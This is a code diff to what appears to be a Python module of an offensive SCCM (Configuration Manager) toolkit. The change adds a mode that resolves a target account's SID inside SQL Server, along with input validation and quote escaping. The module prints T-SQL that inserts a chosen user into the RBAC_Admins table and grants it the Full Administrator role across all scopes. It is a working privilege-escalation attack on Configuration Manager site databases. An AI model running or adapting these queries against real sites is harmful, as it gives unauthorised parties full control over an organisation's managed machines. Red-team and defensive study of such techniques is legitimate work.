@@ -4,6 +4,7 @@ from impacket.ldap import ldaptypes
 import ldap3
 from getpass import getpass
 import json
+import re
 from ldap3.protocol.formatters.formatters import format_sid
 
 
@@ -18,7 +19,7 @@ class MSSQL:
 
     def __init__(self, username=None, password=None, domain=None, target_dom=None,
                         dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None,
-                        aes=None, debug=False, target_user=None, stacked=False, channel_binding=False, signing=False, site_code=None):
+                        aes=None, debug=False, target_user=None, stacked=False, channel_binding=False, signing=False, site_code=None, sql_sid=False):
             self.username = username
             self.password = password
             self.domain = domain
@@ -31,6 +32,7 @@ class MSSQL:
             self.aes = aes
             self.debug = debug
             self.target_user = target_user
+            self.sql_sid = sql_sid
             self.stacked = stacked
             self.channel_binding = channel_binding
             self.signing = signing
@@ -39,6 +41,18 @@ class MSSQL:
             self.query_sid = ""
     
     def run(self):
+        if self.sql_sid:
+            if not self.site_code or not re.fullmatch(r'[A-Za-z0-9]{3}', self.site_code):
+                logger.info('[-] Invalid site code. Use three alphanumeric characters.')
+                return False
+            if not self.target_user or len(self.target_user.encode('utf-16le')) > 256 or not re.fullmatch(r'[^\\\r\n]+\\[^\\\r\n]+', self.target_user):
+                logger.info('[-] Use NETBIOS\\account (up to 128 UTF-16 code units) for the target user with -sql-sid.')
+                return False
+            self.netbiosname, self.target_user = self.target_user.split('\\', 1)
+            return self.mssql_abuse()
+        if not self.domain or not self.dc_ip:
+            logger.info('[-] Domain (-d) and domain controller (-dc-ip) are required for LDAP SID resolution.')
+            return False
            
         lmhash = ""
         nthash = ""
@@ -127,23 +141,39 @@ class MSSQL:
         
         self.mssql_abuse(self.querysid)
         
-    def mssql_abuse(self,hex_sid):
-        hex_sid = hex_sid
+    def mssql_abuse(self,hex_sid=None):
         logger.info(f"[*] Use the following to add {self.target_user} as a Site Server Admin.")
-        #need to fix this to get the flatname of the domain. from testing the domain doesn't really matter and
-        #is used just for display
-        formatted_user = f'{self.netbiosname}\\{self.target_user}'
+        sid_query = ""
+        if hex_sid is None:
+            formatted_user = f'{self.netbiosname}\\{self.target_user}'.replace("'", "''")
+            sid_query = f"""DECLARE @AdminSID VARBINARY(85);
+BEGIN TRY
+    SET @AdminSID = SUSER_SID(N'{formatted_user}');
+END TRY
+BEGIN CATCH
+    THROW;
+END CATCH;
+IF @AdminSID IS NULL
+    THROW 50000, 'Failed to resolve target SID. No RBAC changes made.', 1;
+"""
+            hex_sid = '@AdminSID'
+            user_literal = f"N'{formatted_user}'"
+        else:
+            #need to fix this to get the flatname of the domain. from testing the domain doesn't really matter and
+            #is used just for display
+            formatted_user = f'{self.netbiosname}\\{self.target_user}'
+            user_literal = f"'{formatted_user}'"
         
         if self.stacked:
             query = f'''
-DECLARE @AdminID INT; USE CM_{self.site_code}; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {hex_sid}, '{formatted_user}', 0, 0, '', '', '', '', '{self.site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = '{formatted_user}' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{formatted_user}'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('SMS0001R', 'SMS00ALL', 29), ('SMS0001R', 'SMS00001', 1), ('SMS0001R', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );
+{sid_query}DECLARE @AdminID INT; USE CM_{self.site_code}; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {hex_sid}, {user_literal}, 0, 0, '', '', '', '', '{self.site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = {user_literal} ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = {user_literal}); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('SMS0001R', 'SMS00ALL', 29), ('SMS0001R', 'SMS00001', 1), ('SMS0001R', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );
             '''
             print(query)
             return
     
         first_queries = f'''
 use CM_{self.site_code}
-INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'{self.netbiosname}\\{self.target_user}',0,0,'','','','','{self.site_code}');
+{sid_query}INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},{user_literal},0,0,'','','','','{self.site_code}');
 SELECT AdminID,LogonName FROM RBAC_Admins;
         '''
         print(first_queries)
